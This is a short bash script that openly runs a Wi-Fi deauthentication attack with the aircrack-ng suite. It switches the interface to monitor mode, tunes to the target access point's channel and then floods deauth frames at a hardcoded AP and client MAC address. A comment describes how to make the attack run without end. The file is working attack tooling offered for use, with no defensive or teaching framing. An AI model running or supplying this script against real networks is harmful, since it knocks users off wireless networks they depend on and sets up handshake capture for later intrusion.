#!/bin/bash

if [ "$1" == '-h' -o "$1" == '--help' ]; then
  echo "Launch deauth attack on targetted AP and client"
  echo "Change values in script"
  exit 0
fi

# Change these

interface="wlan1mon" # your_wireless_interface_name+'mon'
AP_bssid="f6:cb:52:c0:9d:5b"
dest_bssid="c8:3d:d4:6b:21:61"
# You can set this to 0 to run the attack indefinitely (until an error occurs or you hit Ctrl-C)
# But then you have to switch interface to managed mode manually
deauth_count="10"

if ! which aircrack-ng &> /dev/null; then
  echo "Package 'aircrack-ng' is not installed !"
  echo "Exiting..."
  exit 1
fi

if ! which ifconfig &> /dev/null; then
  echo "Package 'ifconfig' is not installed !"
  echo "Exiting..."
  exit 1
fi

if ! which iwconfig &> /dev/null; then
  echo "Package 'iwconfig' is not installed !"
  echo "Exiting..."
  exit 1
fi

sudo echo

echo "Target access point : "$AP_bssid""
echo "Target client : "$dest_bssid""
echo

if ! ifconfig "$interface" &> /dev/null; then
  echo "Switching "${interface/mon/}" to monitor mode..."
  if ! sudo airmon-ng start "${interface/mon/}" &> /dev/null; then
    echo "Interface error !"
    echo "Exiting..."
    exit 1
  fi
fi

output=`sudo aireplay-ng --test -a "$AP_bssid" -c "$dest_bssid" "$interface"`
new_channel=`echo -e "$output" | grep -o -G "AP uses channel [[:digit:]]*" | cut -d" " -f4`
if [ "$new_channel" != "" ]; then
  echo "Setting "$interface" to AP channel "$new_channel"..."
  echo
  sudo iwconfig "$interface" channel "$new_channel" &> /dev/null
else
  (echo "$output" | grep "No such BSSID available.") &> /dev/null
  if [ $? -eq 0 ]; then
    echo "BSSID error !"
    echo "Exiting..."
    exit 1
  fi
fi

echo "Starting deauth attack..."
sleep 1
sudo aireplay-ng --deauth "$deauth_count" -a "$AP_bssid" -c "$dest_bssid" "$interface"
sudo airmon-ng stop "$interface" &> /dev/null
